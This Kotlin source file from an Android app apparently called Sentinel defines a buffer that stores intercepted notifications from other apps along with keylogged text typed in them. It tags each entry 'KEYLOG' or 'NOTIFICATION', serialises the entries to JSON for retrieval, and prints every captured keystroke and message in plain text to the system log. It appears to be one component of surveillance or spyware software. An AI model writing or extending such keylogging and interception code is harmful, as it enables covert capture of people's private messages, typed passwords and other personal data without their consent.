package com.sentinel.host.data.device

import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.ConcurrentLinkedQueue
import javax.inject.Inject
import javax.inject.Singleton

data class LogEntry(
    val type: String, // "NOTIFICATION" or "KEYLOG"
    val packageName: String,
    val title: String,
    val text: String,
    val timestamp: Long
)

@Singleton
class SentinelLogBuffer @Inject constructor() {
    companion object {
        private const val TAG = "Sentinel:LogBuffer"
        private const val MAX_CAPACITY = 250
        val instance by lazy { SentinelLogBuffer() }
    }

    private val queue = ConcurrentLinkedQueue<LogEntry>()

    fun addNotification(packageName: String, title: String, text: String) {
        if (packageName.isBlank() && title.isBlank() && text.isBlank()) return
        val entry = LogEntry(
            type = "NOTIFICATION",
            packageName = packageName,
            title = title,
            text = text,
            timestamp = System.currentTimeMillis()
        )
        offerEntry(entry)
        Log.i(TAG, "Notification logged into buffer (total=${queue.size}): [$packageName] $title: $text")
    }

    fun addKeylog(packageName: String, text: String) {
        if (text.isBlank()) return
        val entry = LogEntry(
            type = "KEYLOG",
            packageName = packageName,
            title = "Typed Text",
            text = text,
            timestamp = System.currentTimeMillis()
        )
        offerEntry(entry)
        Log.i(TAG, "Keylog logged into buffer (total=${queue.size}): [$packageName] $text")
    }

    private fun offerEntry(entry: LogEntry) {
        queue.offer(entry)
        while (queue.size > MAX_CAPACITY) {
            queue.poll()
        }
    }

    fun getLogsAsJsonArray(): JSONArray {
        val array = JSONArray()
        val list = queue.toList()
        for (entry in list) {
            val obj = JSONObject().apply {
                put("type", entry.type)
                put("package", entry.packageName)
                put("title", entry.title)
                put("text", entry.text)
                put("timestamp", entry.timestamp)
            }
            array.put(obj)
        }
        Log.i(TAG, "getLogsAsJsonArray called, returning ${array.length()} entries")
        return array
    }

    fun clear() {
        queue.clear()
    }
}
